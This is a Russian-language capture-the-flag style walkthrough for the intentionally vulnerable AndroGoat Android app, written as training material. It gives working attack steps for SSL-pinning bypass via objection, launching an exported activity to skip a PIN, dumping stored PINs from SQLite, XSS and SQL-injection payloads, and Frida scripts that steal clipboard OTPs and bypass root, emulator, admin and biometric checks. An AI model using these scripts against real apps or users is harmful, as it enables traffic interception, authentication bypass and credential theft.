# Задание 1. Network Intercepting

У нас уже прокинут сертификат бурпа, потому нам надо заставить его отдавать на бурп запросы
```shell
adb reverse tcp:8080 tcp:8080
```

После поднимаем frida-server на МП:
```shell
 adb shell "/data/local/tmp/frida-server &"
```

И в отдельном окне запускаем objection:
```powershell
PS C:\WINDOWS\system32> objection -n owasp.sat.agoat start
(agent) Pre-v17 version of Frida detected. Attempting to use old bridge interface.

     _   _         _   _
 ___| |_|_|___ ___| |_|_|___ ___
| . | . | | -_|  _|  _| | . |   |
|___|___| |___|___|_| |_|___|_|_|
      |___|(object)inject(ion) v1.12.5

     Runtime Mobile Exploration
        by: @leonjza from @sensepost

[tab] for command suggestions
owasp.sat.agoat (run) on (Android: 14) [usb] # android
Unknown or ambiguous command: `android`. Try `help android`.
owasp.sat.agoat (run) on (Android: 14) [usb] # android sslpinning disable
(agent) Custom TrustManager ready, overriding SSLContext.init()
(agent) Found okhttp3.CertificatePinner, overriding CertificatePinner.check()
(agent) Found okhttp3.CertificatePinner, overriding CertificatePinner.check$okhttp()
(agent) Found com.android.org.conscrypt.TrustManagerImpl, overriding TrustManagerImpl.verifyChain()
(agent) Found com.android.org.conscrypt.TrustManagerImpl, overriding TrustManagerImpl.checkTrustedRecursive()
(agent) Registering job 205572. Name: android-sslpinning-disable
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called SSLContext.init(), overriding TrustManager with empty one.
(agent) [205572] Called check$okhttp OkHTTP 3.x CertificatePinner.check$okhttp(), not throwing an exception.
(agent) [205572] Called (Android 7+) TrustManagerImpl.checkTrustedRecursive(), not throwing an exception.
(agent) [205572] Called check$okhttp OkHTTP 3.x CertificatePinner.check$okhttp(), not throwing an exception.
(agent) [205572] Called (Android 7+) TrustManagerImpl.checkTrustedRecursive(), not throwing an exception.
(agent) [205572] Called check$okhttp OkHTTP 3.x CertificatePinner.check$okhttp(), not throwing an exception.
owasp.sat.agoat (run) on (Android: 14) [usb] #
```
# Задание 2. Unprotected Android Component

Смотрим на manifest и видим:
```xml
<activity
            android:label="@string/activity"
            android:name="owasp.sat.agoat.AccessControl1ViewActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <data
                    android:scheme="androgoat"
                    android:host="vulnapp"/>
            </intent-filter>
        </activity>
```
Больший интерес есть к **android:exported="true">**, он означает, что данный экран (**Activity**) доступен для запуска из других приложений или внешней системы Android

Можно сразу запустить activity без проверки PIN:
```shell
adb shell am start -n owasp.sat.agoat/.AccessControl1ViewActivity
```
![скрин](imgs/{B1387DF8-615F-4A5A-A81F-064A2B946AE1}.png)

# Insecure Data Storage
## Part 1
Просто cat по файлу:
![скрин](imgs/{10E83026-0565-4557-A919-64CD62221B71}.png)

## Part 2
Пишем в `sheredPreferences`:
```bash
sed -i '/name="score"/s/value="[0-9]*"/value="100"/' score.xml
```

Перезапускаем МП и видим решенное
![скрин](imgs/{195859C6-4D97-4261-8261-89DF6A1327B4}.png)

## Part 3

Заходим в директорию бд:
	```bash
cd databases && ls
```

Находим таблицу с пользователями и подключаемся по sqlite:
```bash
sqlite3 androgoat_userpins.db
```

Просматриваем таблицы в бд и выводим пользователей с паролями:
```bash
.tables
select * from user_pins;
```

## Part 4

Тут все просто, когда мы нажимаем кнопку `Verify`, то мы сохраняем наш user+pass в мп:
![скрин](imgs/{0C2C7557-26D6-401D-93A0-4C455A8B69DE}.png)
## Part 5

После нажатия на кнопку `Verify` сохраняется в хранилище sd-карты. Мы должны перейти в нее и искать уже по ней.

Например, я писал в поля значения 123:
```bash
emu64x:/sdcard # grep -r "123"
./Android/data/owasp.sat.agoat/files/users3459974037704683755_tmp: Username - 123 Password -123
```

# Input Validations
## XSS

```js
<script>window.location='https://youtube.com'</script>
<script>alert(123)</script>
```

## SQLi
```sql
qw' OR 1==1;
```

## WebView и QR Code предлагается разобраться самостоятельно!
### Вы все сможете!

# Side Channel Data Leakage

Данный раздел посвящен утечкам данных. Разберем.
## Keyboard Cache
**Keyboard Cache** мы пропустим, потому что может не всегда работать на AOSP (это фича, не баг). 
Но суть такова, что мы можем видеть все введенные слова и символы в бинарном/текстовом виде, включая пароли.
Чтобы защититься от этого необходимо использовать `android:inputType="textPassword"` + `android:importantForAutofill="no"` + `android:privateImeOptions="nm"` (для некоторых клавиатур)

## Insecure Logging
![скрин](imgs/{B541B3FE-5C15-486A-8291-28E7D603A348}.png)

После ввода в поля и нажатии на кнопку, посмотрим на логи с помощью команды `adb logcat`:
```bash
adb logcat | grep -i "owasp\|androgoat\|password\|username"
```

![скрин](imgs/{6788F188-E0EF-44BE-9942-F5D90234BF24}.png)

## Clipboard
![скрин](imgs/{7540B9DE-02C1-4DEA-8C7F-6D80C9CB3D5E}.png)

Приложение позволяет копировать чувствительные данные в буфер обмена. Любое другое приложение на устройстве может прочитать этот буфер.

![скрин](imgs/{FF6AFE77-CD3D-4605-AAE3-8BE0A034568F}.png)

Пишем фрида-скрипт:
```js
Java.perform(function () {
    var ClipboardManager = Java.use('android.content.ClipboardManager');

    ClipboardManager.setPrimaryClip.overload('android.content.ClipData').implementation = function (clip) {
        var label = clip.getDescription().getLabel().toString();
        var item = clip.getItemAt(0);
        var text = item.getText().toString();

        console.log('OTP:' + text);

        this.setPrimaryClip(clip);
    };
    console.log('Waiting for OTP...');
});
```
# Hardcoded Issues - самостоятельно

# Root detection
Можно сразу отрубить с помощью `objection`:
![скрин](imgs/{80A9C134-3981-4DE2-8BEB-28037A3A88B5}.png)

А можно посмотреть код:
![скрин](imgs/{02F692BD-64EA-46CD-AAC1-31CAC440F009}.png)
Увидеть, что возвращаются логические переменные в функциях, изменить их возврат для прохождения рута.
```js
Java.perform(function(){
    var RootDetectionActivity = Java.use("owasp.sat.agoat.RootDetectionActivity");
    RootDetectionActivity["isRooted"].implementation = function () {
        console.log(`RootDetectionActivity.isRooted is called`);
        let result = this["isRooted"]();
        console.log(`RootDetectionActivity.isRooted result=${result}`);
        return false;
    };
});
```
![скрин](imgs/{2EC64C2B-7C9D-4A44-9D4D-7222005D815D}.png)

# Emulator detection
Напишем скрипт для 'frida'
```js
Java.perform(function(){
    var EmulatorDetectionActivity = Java.use("owasp.sat.agoat.EmulatorDetectionActivity");
    EmulatorDetectionActivity["isEmulator"].implementation = function () {
        console.log(`EmulatorDetectionActivity.isEmulator is called`);
        let result = this["isEmulator"]();
        console.log(`EmulatorDetectionActivity.isEmulator result=${result}`);
        return false;
    };
});
```
![скрин](imgs/{CC55E585-F8B3-4855-AF18-3EF0E34B6E35}.png)


# Binary Patching
![скрин](imgs/{17847161-8723-420D-A053-9110ED94D30E}.png)

По коду видим, что есть проверка на админский функционал:
![скрин](imgs/{3F188846-70D9-4E70-BC90-89FDED3DB213}.png)

Попробуем напрямую изменить состояние на `true`:
```js
Java.perform(function(){
    var BinaryPatchingActivity = Java.use("owasp.sat.agoat.BinaryPatchingActivity");
    BinaryPatchingActivity.onCreate.overload('android.os.Bundle').implementation = function (savedInstanceState) {
    
        this.isAdmin.value = true;
        console.log('isAdmin set to: ' + this.isAdmin.value);

        this.onCreate(savedInstanceState);
    };
});
```

И у нас получилось!

![скрин](imgs/{80089C15-DC41-4FAE-BBE6-9216E4BB7E29}.png)

# Biometric auth

Ну, это вообще хардкод.
Такое советую делать статикой, поскольку smali проще вернуть нужный вызов.

Данный кусок практики лучше решать через фриду, скрипт опишу с комментариями:
```js
Java.perform(function () {

    console.log('Biometric bypass loaded');
    var AuthCallback = Java.use('androidx.biometric.BiometricPrompt$AuthenticationCallback');
    var AuthResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
    var BiometricManager = Java.use('androidx.biometric.BiometricManager');
    // Создаем валидный AuthenticationResult (crypto=null, authType=0)
    var fakeResult;
    
    try {
        fakeResult = AuthResult.$new(null, 0);
        console.log('AuthResult created: ' + fakeResult);
    } catch (e) {
        console.log('$new(null,0) failed: ' + e);
        // Fallback через reflection
        var ctors = AuthResult.class.getDeclaredConstructors();
        for (var i = 0; i < ctors.length; i++) {
            console.log('Available ctor: ' + ctors[i]);
        }
        var ctor = AuthResult.class.getDeclaredConstructors()[0];
        ctor.setAccessible(true);
        var pCount = ctor.getParameterTypes().length;
        if (pCount === 0) fakeResult = ctor.newInstance([]);
        else if (pCount === 1) fakeResult = ctor.newInstance([null]);
        else fakeResult = ctor.newInstance([null, 0]);
        console.log('AuthResult created via reflection');
    }
    // Обход canAuthenticate
    try {
        BiometricManager.canAuthenticate.overload('int').implementation = function (strength) {
            console.log('canAuthenticate -> 0');
            return 0;
        };
    } catch (e) {}
    // failed -> success (с ВАЛИДНЫМ результатом, не null!)
    AuthCallback.onAuthenticationFailed.implementation = function () {
        console.log('onAuthenticationFailed -> forcing success');
        this.onAuthenticationSucceeded(fakeResult);
    };
    // error -> success (с ВАЛИДНЫМ результатом!)
    AuthCallback.onAuthenticationError.overload('int', 'java.lang.CharSequence').implementation = function (code, err) {
        console.log('onAuthenticationError(' + code + ') -> forcing success');
        this.onAuthenticationSucceeded(fakeResult);
    };
    // Бонус: мгновенный success при вызове authenticate (без нажатия Cancel)
    try {
     BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function (promptInfo) {
            console.log('authenticate() intercepted');
            var fields = this.class.getDeclaredFields();
            var callback = null;
            for (var i = 0; i < fields.length; i++) {
                fields[i].setAccessible(true);
                var val = fields[i].get(this);
                if (val) {
                    var name = val.getClass().getName();
                    if (name.indexOf('AuthenticationCallback') !== -1 || name.indexOf('BioMetricAuthActivity') !== -1) {
                        callback = val;
                        console.log('Found callback: ' + name);
                        break;
                    }
                }
            }
            if (callback && fakeResult) {
                try {
                    var method = callback.getClass().getDeclaredMethod('onAuthenticationSucceeded', [AuthResult.class]);
                    method.setAccessible(true);
                    method.invoke(callback, [fakeResult]);
                    console.log('SUCCESS! Admin dialog shown instantly.');
                    return;
                } catch (e) {
                    console.log('Direct invoke failed: ' + e);
                }
            }
            // Fallback: вызываем оригинал (появится диалог, но Cancel теперь тоже даст success)
            this.authenticate(promptInfo);
        };
    } catch (e) {
        console.log('Authenticate hook skipped: ' + e);
    }

    console.log('[*] Ready. Press the Biometric Auth button.');
});
```

Да, нам с вами пришлось переписать весь `Activity`, но в этом то и вся прелесть, что мы динамически, не пересобирая apk, можем исследовать множество аспектов безопасности.

![скрин](imgs/{05104D34-D2C0-4FE7-9B1F-AFC08745E282}.png)
